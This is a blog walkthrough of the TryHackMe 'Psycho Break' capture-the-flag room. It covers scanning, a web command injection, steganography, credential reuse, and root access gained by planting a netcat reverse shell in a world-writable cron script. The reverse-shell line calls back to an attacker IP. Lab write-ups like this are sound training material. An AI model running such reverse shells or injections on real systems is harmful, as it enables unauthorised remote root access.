---
layout: post
title: TryHackMe Walkthrough - Psycho Break
date: 2021-03-24
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Easy
permalink: /2021/03/TryHackMe-Walkthrough-PsychoBreak/
img: 2021/03/PsychoBreak/06TheKeeper.png
---

This is my walkthrough of the [Psycho Break room on TryHackMe](https://tryhackme.com/room/psychobreak). This is a room based on the video game Evil Within. It's marked as easy, but I have to admit I had a hard time with some parts. Mostly with the first encryption, and the very limited command injection.

* Room: Psycho Break
* Difficulty: Easy
* URL: https://tryhackme.com/room/psychobreak


## Opened Port
I first start the room by scanning for open ports. As I recently did the [RustScan room](https://tryhackme.com/room/rustscan), I used it to run my scan. 

```bash
rustscan -a target -- -A -script vuln | tee rust.txt

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.48.222:21
Open 10.10.48.222:22
Open 10.10.48.222:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")


PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.5a
|_sslv2-drown: 
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:33
Completed NSE at 17:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:33
Completed NSE at 17:33, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 332.09 seconds
```

The scan gives us the answers to two questions from the room. There are 3 ports opened on the machine 21 (FTP), 22 (SSH), and 80 (HTTP). And the OS is Ubuntu.

FTP does not allow anonymous login, so I started looking at the web site.

## Web Site

I loaded http://target/, the site is themed around the video game Evil Within. It consist of an image and some text about an incident at a mental hospital. 

![Room Web Site](/assets/images/2021/03/PsychoBreak/01WebSite.png "Room Web Site")

I looked at the HTML and saw two things that did not appear on the page.

A comment that point to a different page.
```html
<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
```

And a link that is suppose to point to a map, but gives us a 404.
```html
<a href="map.html" style="color: #fff;">Here is the map</a>
```

### The Sadist Room

I went to the [Sadist Room](http://target/sadistRoom/). 
![The Sadist Room](/assets/images/2021/03/PsychoBreak/02SadistRoom.png "The Sadist Room")

There is a link to get the key to the locker room. When you click on the link, you get the key, which is the answer to the next question on TryHackMe. 

When you dismissed the popup with the key, the room changes, you need to click on a button and re-enter the key to get to the Locker Room.

### The Locker Room.

![The Locker Room](/assets/images/2021/03/PsychoBreak/03LockerRoom.png "The Locker Room")

In the locker room, we have another link to the map. This time it's a php file. There is an encoded text that we need to decode to access the map.

I tried a few things to crack that one: ROT13, I tried the Vigenère cipher with all the words found on the page, I tried the XOR brute force of CyberChef. Nothing worked. 

I looked around the encryption category on CyberChef, and after trying many of them, I found the [Atbash Cipher](https://en.wikipedia.org/wiki/Atbash). It's a simple substitution cipher where each letter of the alphabet is mapped to a reverse alphabet. 

Using the cipher on [CyberChef](https://gchq.github.io/CyberChef/#recipe=Atbash_Cipher()), I got the key to access the map. It's also the answer to the next question in the room.

![The Map](/assets/images/2021/03/PsychoBreak/04TheMap.png "The Map")

The map contains the two room I already accessed, and two other. 
* Safe Heaven
* The Abandoned Room

## Safe Heaven

![Safe Heaven](/assets/images/2021/03/PsychoBreak/05SafeHeaven.png "Safe Heaven")

This room contains a gallery with a few images. The source code also contain the following comment.

```html
<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->
```

I launched GoBuster on the `/SafeHeaven/` folder and after some time it found one folder. 

```bash
gobuster dir -e -u http://target/SafeHeaven/ -t30 -w ~/Kali/ScriptsAndTools/DirectoryList.txt

```

## The Keeper's Page

I went to The [Keeper's page](http://target/SafeHeaven/keeper/). 

![The Keeper](/assets/images/2021/03/PsychoBreak/06TheKeeper.png "The Keeper")

I clicked on the Escape button. Which took me to a page that shows some stairs and gave me 1m 45s to find where the image was taken. 

![Save Yourself](/assets/images/2021/03/PsychoBreak/07SaveYourself.png "Save Yourself")

I used Google reverse image search and found the location. I submitted the answer and got redirected the a page that gave me the Keeper Key. I used that key for the room question. And kept it for later.

```
You Got The Keeper Key !!!
Here is your key : THE_KEY
```

## The Abandoned Room

The next room on the map is the Abandoned Room. I had to provide the Keeper Key to enter it. 

![The Abandoned Room](/assets/images/2021/03/PsychoBreak/08AbandonedRoom.png "The Abandoned Room")

When I clicked on Go Further, I was taken to another page when I was give 1m 45s to escape Laura the Spiderlady.

![The Spiderlady](/assets/images/2021/03/PsychoBreak/09LauraTheSpiderLady.png "The Spiderlady")

Looking at the page source, it says there is a shell on that page. 
```html
<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->
```

I appended `?shell=ls` to the end of the URL.

http://target/abandonedRoom/RANDOM_STRING/herecomeslara.php?shell=ls

![Files Listing](/assets/images/2021/03/PsychoBreak/10FilesListing.png "Files Listing")

This list the  files in the same folder as the current page. Sadly there is nothing interesting in there. 

I started experimenting with other commands. And most of them gave me an error. 
```
Command Not Permitted !!!
```

I tried many things, and failed all the time. I could not get anything other than `ls` working. After a while, I finally got  `?shell=ls ..` to work. It took me a while because I was always trying `ls ../` with the extra / at the end and that was rejected.

Having the listing of the parent folder, I now see another folder. 

http://target/abandonedRoom/OTHER_RANDOM_STRING/

![Other Listing](/assets/images/2021/03/PsychoBreak/11FoundFolderListing.png "Other Listing")

The name of the text file is the answer to the next question in the room. The file contains this text:
```
You made it. Escaping from Laura is not easy, good job ....
```

There is also a zip file. I downloaded it and extracted it's content. 

```bash
$ unzip helpme.zip 
Archive:  helpme.zip
  inflating: helpme.txt              
  inflating: Table.jpg               

$ cat helpme.txt 

From Joseph,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
this cell.
```

Joseph is the answer to the next question in the room.

There is a jpeg file in the zip. But running file on it shows that it's not an image.

```bash
$ file Table.jpg 
Table.jpg: Zip archive data, at least v2.0 to extract

$ unzip Table.jpg
Archive:  Table.jpg
  inflating: Joseph_Oda.jpg          
  inflating: key.wav                 

$ file Joseph_Oda.jpg 
Joseph_Oda.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 350x490, components 3

$ file key.wav 
key.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 8000 Hz
```

I looked at the exif data on both file with exiftool, there was nothing interesting. I opened the wav file with Sonic Visualiser, but I did not see anything in there. 

Then I listened to the audio file. It sounded like Morse code. So I looked for a decoder online and [found one](https://morsecode.world/international/decoder/audio-decoder-adaptive.html). The message in the Morse code is the answer to the next question in the room. 

After the tool decoded the message, I used it to extract a file hidden in the image.

```bash
steghide extract -sf Joseph_Oda.jpg 
Enter passphrase: 
wrote extracted data to "thankyou.txt".

$ cat thankyou.txt 

From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help 
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. 
But for some reason there is my name listed on the note which I don't have a clue.

           --------------------------------------------
        //                                              \\
        ||      (NOTE) FTP Details                      ||
        ||      ==================                      ||
        ||                                              ||
        ||      USER : joseph                           ||
        ||      PASSWORD : PASSWORD                     ||
        ||                                              ||
        \\                                              //
           --------------------------------------------


Good luck, Be carefull !!!
```

The FTP username and password are the answers to the last two questions of that section.

## FTP
I used the credentials to connect to the FTP server. And download the two files I found on it.

```bash
ftp target
Connected to target.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.153.109]
Name (target:): joseph
331 Password required for joseph
Password:
230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13  2020 program
-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
226 Transfer complete

ftp> get random.dic
local: random.dic remote: random.dic
200 PORT command successful
150 Opening BINARY mode data connection for random.dic (974 bytes)
226 Transfer complete
974 bytes received in 0.00 secs (1.2937 MB/s)

ftp> binary
200 Type set to I

ftp> get program
local: program remote: program
200 PORT command successful
150 Opening BINARY mode data connection for program (11641688 bytes)
226 Transfer complete
11641688 bytes received in 27.23 secs (417.4516 kB/s)

ftp> quit

$ file random.dic 
random.dic: ASCII text, with CRLF line terminators

$ file program 
program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped

```

The file `random.dic` seems to contain a list of potential passwords. 

I launched another VM to run the program. 

```bash
$ ./program     
[+] Usage

./program <word>

$ ./program aaaa
aaaa => Incorrect
```

Looks like the program will give me what I need if I give it the correct password. I could have try to reverse it, but since we have a small list of potential password, it's a lot easier to brute force it. I wrote a small python script that looped through all the keys found in dictionary file and try them with the program. 

It found the correct key after less that a minutes. Then the program gave me a string of numbers to decode.

```bash
./program kidman             
kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```

I tried that strings on the Magic recipe in CyberChef, but it did not find anything.

After searching a lot about what kind of cipher this could I finally saw someone mentioning T9 keyboards for a similar code. Then it was evident that this was the correct cipher. I remember typing on those and hating it. This is how you type words on old cell phone with only digits. There would be 3 or 4 characters per digits. You would need to type the same digit multiple time to get the letter you wanted. 

I found a [picture of a T9 keypad](https://www.dcode.fr/phone-keypad-cipher) and used it to decipher the message. Then used it as the answer to the question in the room.

## SSH

From there, I could use ssh to connect to the server using the username kidman and the password from the previous question (all in uppercase).

```bash
ssh kidman@target
kidman@target's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
...
Last login: Fri Aug 14 22:28:13 2020 from 192.168.1.5
kidman@evilwithin:~$ ls -la
total 52
drwxr-xr-x 4 kidman kidman 4096 Mar 25 03:50 .
drwxr-xr-x 5 root   root   4096 Jul 13  2020 ..
... 
-rw-rw-r-- 1 kidman kidman  264 Aug 13  2020 .readThis.txt
-rw-r--r-- 1 root   root     25 Mar 25 03:50 .the_eye.txt
-rw-rw-r-- 1 kidman kidman   33 Jul 13  2020 user.txt

kidman@evilwithin:~$ cat user.txt 
THE_USER_FLAG
```

We have the first flag.

There are also two hidden files in kidman's home folder.

```bash
kidman@evilwithin:~$ cat .readThis.txt 

uC@> z:5>2?i

%96 E9:?8 x 2> 23@FE E@ E6== D@ :D E@A D64C6E] }@ @?6 5@6D?VE <?@H 23@FE E9:D] xEVD E96 #FG:<VD 6J6] }@ @?6 42? 9:56 2H2J 7C@> :E] qFE x 42? E6== J@F @?6 E9:?8 D62C49 7@C E96 DEC:?8 YE9606J60@70CFG:<Y ] *@F 8@E E@ 96=A $632DE:2? 56762E #FG:< ]]]



kidman@evilwithin:~$ cat .the_eye.txt 
No one shall hide from me

```

The `.readThis.txt` file seem to have some encrypted content. And the other one could be the key. I left them aside to explore a little.

I checked for sudo and crons. 

```bash
kidman@evilwithin:~$ sudo -l
[sudo] password for kidman: 
Sorry, user kidman may not run sudo on evilwithin.

kidman@evilwithin:~$ crontab -l
no crontab for kidman

kidman@evilwithin:~$ cat /etc/crontab 

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```

There is a cron that runs as root every two minutes. Lets look at it. 

```bash
kidman@evilwithin:~$ ls -la /var/.the_eye_of_ruvik.py
-rwxr-xrw- 1 root root 300 Aug 14  2020 /var/.the_eye_of_ruvik.py

kidman@evilwithin:~$ cat /var/.the_eye_of_ruvik.py
```

```python
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)
```

The file can be written by anyone. So I injected a reverse shell in the file. 

```python
import os

os.system("mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg")

```

I started a Netcat listener, and waited for the connection back.

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.13.19 56178

whoami
root

cat /root/root.txt
THE_ROOT_FLAG
```

## Defeat Ruvik

There is one last task: to defeat Ruvik. I thought this might have to do with the encrypted file from before. Turned out it's simply ROT47.

```
From Kidman:

The thing I am about to tell so is top secret. No one doesn't know about this. It's the Ruvik's eye. No one can hide away from it. But I can tell you one thing search for the string *the_eye_of_ruvik* . You got to help Sebastian defeat Ruvik ...
```

There is also a `readMe.txt` in `/root/`. 

```bash
root@evilwithin:~# cat /root/readMe.txt 
 /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
|  From Sebastian :                                                                     |
|                                                                                       |
|  You have one final task ... Help me to defeat ruvik !!!                              |
|                                                                                       |
 \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

```

I looked for the string "the_eye_of_ruvik" on the server. 

```bash
grep -R the_eye_of_ruvik / 2>/dev/null
```

This took a while, without finding anything. So I went and look at the hint on TryHackMe. 

```
Delete user Ruvik account.
```

That's easy enough. I canceled the grep that was still running and deleted the user account.
```bash
root@evilwithin:~# ls -la /home/ruvik/
total 24
drwxr-xr-x 2 ruvik ruvik 4096 Jul 13  2020 .
drwxr-xr-x 5 root  root  4096 Jul 13  2020 ..
-rw------- 1 ruvik ruvik    5 Jul 13  2020 .bash_history
-rw-r--r-- 1 ruvik ruvik  220 Jul 13  2020 .bash_logout
-rw-r--r-- 1 ruvik ruvik 3771 Jul 13  2020 .bashrc
-rw-r--r-- 1 ruvik ruvik  655 Jul 13  2020 .profile

root@evilwithin:~# deluser ruvik
Removing user `ruvik' ...
Warning: group `ruvik' has no more members.
Done.
```

This did not change anything other than the user being gone. But the task did require any answer. So I guess that was it. 
